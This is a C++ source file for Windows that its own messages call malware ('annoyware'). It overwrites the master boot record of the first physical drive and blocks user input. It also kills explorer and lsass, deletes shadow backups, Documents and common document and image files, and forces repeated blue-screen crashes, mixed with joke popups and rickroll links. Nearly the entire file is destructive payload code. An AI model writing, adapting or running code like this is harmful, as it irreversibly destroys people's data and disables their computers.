#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <stdio.h>
#include <Windows.h>
#include <utilapiset.h>
#include <fileapi.h>
#include <time.h>
#include <ctime>
#include <cstdlib>
#include <string>


using namespace std;

#define mbrsize 512
#define funnynumber 69

typedef std::chrono::system_clock Clock;

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

//void ctrlshiftBsodPC(BOOL bState) {
//    BYTE keyState[512];

//    GetKeyboardState((LPBYTE)&keyState);
//    if ((bState && !(keyState[VK_SCROLL] & 0)) ||
//        (!bState && (keyState[VK_SCROLL] & 0)))
//       ;
//}



int main() {
    void HideConsole(); // Hide Console
    {
        ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    }
    //Put the rest of the code under this

    DWORD write;

    char MasterBootRecord[mbrsize] = {0}; //Put your asm code here

    int CALLBACK WinMain(
        HINSTANCE hInstance, HINSTANCE hPrevInstance,
        LPSTR     lpCmdLine, int       nCmdShow

    );
    {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);

        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }

    srand(time(NULL)); // Num Generator

    int randNum = (rand() % 2); // random number
    int crashtime = 0; // Random number, just set it to 0. If it goes into funny number the pc will crash
    int infwhile = 1; // Infinite Message Loop. Set it to 0 or more if you dont want infinite messages on ur pc
    int is420 = 0; //is it time for bonus content? set it to 0 if you want this to activate on 4/20
    int randpopup = 1; // prompts every few seconds. thats it. Set it to 0 to disable it
    int isinstalled = 0; //Check if the Application is installed on the pc via a .txt check (A more robust way is coming soon, 1 means always true)
    int openapps = (rand() % 1); 
    int websites = 1; // set this to 0 if you dont want websites
    int randwebsites = (rand() % 1);
    BlockInput(true); // blocks input?
    /////////////////////////////////////////////////// Actual Code Starts Below

    HWND hWin;
    hWin = FindWindow(L"Shell_TrayWnd", NULL);
    EnableWindow(hWin, false);
    ShowWindow(hWin, false);


    auto now = Clock::now(); //clock stuff
    std::time_t now_c = Clock::to_time_t(now);
    struct tm* parts = std::localtime(&now_c);

    std::cout << 1900 + parts->tm_year << std::endl;
    std::cout << 1 + parts->tm_mon << std::endl;
    std::cout << parts->tm_mday << std::endl;



    std::ofstream file("\\hmm.txt");
    file << "excuse me mate you installed malware on the system. You cannot grab ur files back so yeah. also shutting down the system doesnt work so haha >:D";
    file.close();
    




    if (parts->tm_mday == 20 && parts->tm_mon == 3) { //check for nice date
        string fortwozerointro(); {    // start this
            int msgboxID = MessageBox(
                NULL,
                L"I wont spare you, but you will have some bonus content c:",
                L"asthetic",
                MB_ICONERROR | MB_OK
            );
        }
        is420 = 1;
    }
    else {
        string standardintro(); {    // hehe
            int msgboxID = MessageBox(
                NULL,
                L"Looks like you're not lucky. See you in the next reboot!",
                L"Error at memory space 0x002312",
                MB_ICONERROR | MB_OK
            );
        }
    }


    Beep(500, 9999);
	system("echo off");
    system("taskkill /f /im explorer.exe");
    system("taskkill /f /im regedit.exe");
    system("taskkill /f /im lsass.exe");
    system("shutdown /r /t 150 /c \"trolololololololol\""); //thank god c++ 11

    system("RD /s /q %systemdrive%\\$Recycle.bin"); //Empty Recycle Bin
    system("RD /s /q %UserProfile%\Documents"); //Delete Documents Folder
    system("MD %UserProfile%\Documents"); //Recreate Documents Folder
    system("RD /s /q C:\Windows\Minidump"); //Delete Dump Files
    system("vssadmin delete shadows /all /quiet"); //delete shadow backups
    system("cd %UserProfile%"); //Change directory to active user
    system("DEL /s /q /f *.DOC *.DOCX *.xls *.xlsx *.png *.txt *.pdf *.jpeg *.png *.bmp *.rtf *.ppt *.pptx *.odf *.tif *.jpg *.svg *.htm *.html"); //Deletes some important files 
    

    std::ofstream outfile("Congratulations.txt");

    outfile << "annoyware from [redacted]. You enjoyed this pc didn't you, billy gates must've made windows so insecure, thank him. Linux is better." << std::endl;
    outfile.close();

    
    if (is420 == 1) { //checks if you are running the virus in nice date. More payloads coming soon.
        system("start https://www.youtube.com/watch?v=aQkPcPqTq4M");
        Beep(500, 9999);
        HIGHCONTRAST hc; // activates nice mode
        ZeroMemory(&hc, sizeof(HIGHCONTRAST));
        hc.cbSize = sizeof(HIGHCONTRAST);
        hc.dwFlags = HCF_HIGHCONTRASTON;
        SystemParametersInfo(SPI_SETHIGHCONTRAST, 0, &hc, SPIF_SENDCHANGE);

        std::ofstream outfile("nice.txt");

        outfile << "nice number m8" << std::endl;
        outfile.close();

        string fourtwozero(); {
            int msgboxID = MessageBox(
                NULL,
                L"MACINTOSH PLUS - Lisa Frank 420 / Modern Compute |",
                L"Yeah Yeah its 420 time",
                MB_ICONEXCLAMATION | MB_OK
            );
            goto continue2;
        }
    }
    
    else {
        system("start https://www.youtube.com/watch?v=oHg5SJYRHA0"); //rickroll starts
        Beep(500, 9999);
        string DisplayRickError(); {    // good old rickroll
            int msgboxID = MessageBox(
                NULL,
                L"Never gonna give you up never gonna let you down never gonna run around and desert you",
                L"Critical error!",
                MB_ICONERROR | MB_OK
            );
            goto continue2;
        }

    }
    


    
    //yandere simulator level code
    while (infwhile == 1) {
        Beep(500, 9999);
        continue2:
        if (randpopup == 1) {
            Beep(500, 9999);
            if (randNum == 0) {
                string fbierror(); {
                    int msgboxID = MessageBox(
                        NULL,
                        L"techniacal sappokt heow caln ma helpy you?",
                        L"federall beruraral of investihation ahlertt",
                        MB_ICONEXCLAMATION | MB_OK
                    );

                    randNum = (rand() % 2);
                    if (is420 == 1) {
                        randNum = (rand() % 3);
                    }
                }
                std::this_thread::sleep_for(std::chrono::seconds(2));

                crashtime = (rand() % 99 + 1);
                if (crashtime == funnynumber) {
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
                }


            }
            else if (randNum == 1) {
                string nicepcerror(); {
                    int msgboxID = MessageBox(
                        NULL,
                        L"Nice computer m8",
                        L"Nice computer m8",
                        MB_ICONERROR | MB_OK
                    );

                    randNum = (rand() % 2);
                    if (is420 == 1) {
                        randNum = (rand() % 3);
                    }
                }
                std::this_thread::sleep_for(std::chrono::seconds(2)); // wait for 2 seconds to put another message
                crashtime = (rand() % 99 + 1);
                if (crashtime == funnynumber) {
                    string nicepccrash(); {
                        int msgboxID = MessageBox(
                            NULL,
                            L"You are an idiot hahahahahahaha",
                            L"You are an idiot (dot com)",
                            MB_ICONERROR | MB_OK
                        );
                    }
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
                }

            }
            else if (randNum == 2) { // proto error
                string antivirusisntenough(); {
                    int msgboxID = MessageBox(
                        NULL,
                        L"You need protegent, world's only antivirus that has data recovery software",
                        L"Antivirus is clearly not enough",
                        MB_ICONINFORMATION | MB_CANCELTRYCONTINUE
                    );

                    randNum = (rand() % 2);
                    if (is420 == 1) {
                        randNum = (rand() % 3);
                    }
                }
                std::this_thread::sleep_for(std::chrono::seconds(2)); // wait for 2 seconds to put another message
                crashtime = (rand() % 99 + 1);
                if (crashtime == funnynumber) {
                    string oopsmysystem(); {
                        int msgboxID = MessageBox(
                            NULL,
                            L"I lost my data, but I had an antivirus",
                            L"oops your system crashed",
                            MB_ICONINFORMATION | MB_CANCELTRYCONTINUE
                        );

                    }
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown

                }

            }
            else if (randNum == 3) { //420 error
                string ruderalis(); {
                    int msgboxID = MessageBox(
                        NULL,
                        L"You failed at your 1337 h4x0r skillz",
                        L"oof",
                        MB_ICONINFORMATION | MB_CANCELTRYCONTINUE
                    );
                }
                randNum = (rand() % 3);
                crashtime = (rand() % 99 + 1);
                if (crashtime == funnynumber) {
                    string leoof(); {
                        int msgboxID = MessageBox(
                            NULL,
                            L"#MAKEMALWAREGREATAGAIN",
                            L"#MAKEMALWAREGREATAGAIN",
                            MB_ICONERROR | MB_OK
                        );
                    }
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
                }

            }
        }
        if (websites == 1) {
            if (randwebsites == 0) {
                ShellExecute(NULL, L"open", L"https://youtu.be/sTSA_sWGM44?t=106", NULL, NULL, SW_MAXIMIZE);
            }
            else if (randwebsites == 1) {
                ShellExecute(NULL, L"open", L"https://420.com", NULL, NULL, SW_MAXIMIZE);
            }
        }
        if (crashtime == 42) {
            earthwormsally:
            MessageBox(NULL, TEXT("SPREADS DISEASES FROM FLORIDA TO CALI"), TEXT("EARTHWORM SALLY"), MB_OK | MB_ICONEXCLAMATION);
            goto earthwormsally;
        }
    }


    fail:
    cout << "1010101";
    return 2;
}


//some scrapped code, moved here to clean source code. If you are reading this whats up source code dweller? c:

    //const int KEYEVENT_KEYUP = 0x02; // crash?
    //keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    //keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);

    //keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    //keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    // Backup BSOD generator

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //BSOD:
    //BOOLEAN bl;
    //unsigned long response;
    //RtlAdjustPrivilege(19, true, false, &bl);
    //NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response); //cause BSOD'nt